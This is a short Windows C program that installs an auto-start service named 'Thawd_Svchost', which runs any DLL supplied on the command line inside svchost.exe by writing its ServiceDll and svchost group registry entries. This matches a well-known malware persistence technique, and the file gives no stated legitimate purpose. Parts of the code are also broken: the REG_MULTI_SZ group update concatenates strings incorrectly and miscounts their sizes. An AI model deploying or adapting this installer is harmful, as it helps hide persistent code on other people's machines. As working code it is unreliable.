#include <windows.h>
#include <stdio.h>

#pragma warning(disable:4996)

#define SERVICE_NAME "Thawd_Svchost"

void CreateAndConfigureService(const char* serviceName, const char* displayName, const char* dllPath, const char* svcHostGroup) {
    SC_HANDLE hSCManager = NULL;
    SC_HANDLE hService = NULL;
    HKEY hKey;
    char subKey[256];
    DWORD dwData;

    // Open the Service Control Manager
    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (hSCManager == NULL) {
        printf("Error: OpenSCManager failed. Error code: %lu\n", GetLastError());
        return;
    }
    // Create the service
    char svcHostCmd[256];
    snprintf(svcHostCmd, sizeof(svcHostCmd), "svchost.exe -k %s", svcHostGroup);

    // Create the service
    hService = CreateService(
        hSCManager,               // SCM handle
        serviceName,              // Service name
        displayName,              // Display name
        SERVICE_ALL_ACCESS,       // Desired access
        SERVICE_WIN32_OWN_PROCESS,// Service type
        SERVICE_AUTO_START,       // Start type
        SERVICE_ERROR_NORMAL,     // Error control type
        svcHostCmd, // Path to the executable
        NULL,                     // No load ordering group
        NULL,                     // No tag identifier
        NULL,                     // No dependencies
        NULL,                     // LocalSystem account
        NULL                      // No password
    );

    if (hService == NULL) {
        printf("Error: CreateService failed. Error code: %lu\n", GetLastError());
        CloseServiceHandle(hSCManager);
        return;
    }

    printf("Service created successfully.\n");

    // Close the service handle
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);

    // Now modify the registry to configure the service

    // Set the ServiceDll value under the Parameters subkey
    snprintf(subKey, sizeof(subKey), "SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", serviceName);
    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, subKey, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
        printf("Error creating Parameters subkey.\n");
        return;
    }

    RegSetValueEx(hKey, "ServiceDll", 0, REG_EXPAND_SZ, (const BYTE*)dllPath, strlen(dllPath) + 1);

    RegCloseKey(hKey);

    // Add the service to the svchost group
    snprintf(subKey, sizeof(subKey), "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost");
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, subKey, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        printf("Error opening Svchost registry key.\n");
        return;
    }

    // Check if the group already exists
    DWORD bufSize = 0;
    RegQueryValueEx(hKey, svcHostGroup, NULL, NULL, NULL, &bufSize);

    char* currentServices = (char*)malloc(bufSize + strlen(serviceName) + 2);  // +2 for null terminator and a new line
    if (currentServices) {
        if (bufSize > 0) {
            RegQueryValueEx(hKey, svcHostGroup, NULL, NULL, (LPBYTE)currentServices, &bufSize);
        }
        else {
            currentServices[0] = '\0';
        }

        strcat(currentServices, serviceName);
        strcat(currentServices, "\0");

        if (RegSetValueEx(hKey, svcHostGroup, 0, REG_MULTI_SZ, (const BYTE*)currentServices, bufSize + strlen(serviceName) + 1) != ERROR_SUCCESS) {
            printf("Error setting Svchost group value.\n");
        }

        free(currentServices);
    }
    else {
        printf("Memory allocation error.\n");
    }

    RegCloseKey(hKey);

    printf("Service %s added to svchost group %s successfully.\n", serviceName, svcHostGroup);
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: %s <ServiceDllPath> <SvcHostGroup>\n", argv[0]);
        return 1;
    }


    const char* dllPath = argv[1];
    const char* svcHostGroup = argv[2];

    CreateAndConfigureService(SERVICE_NAME, SERVICE_NAME, dllPath, svcHostGroup);

    return 0;
}
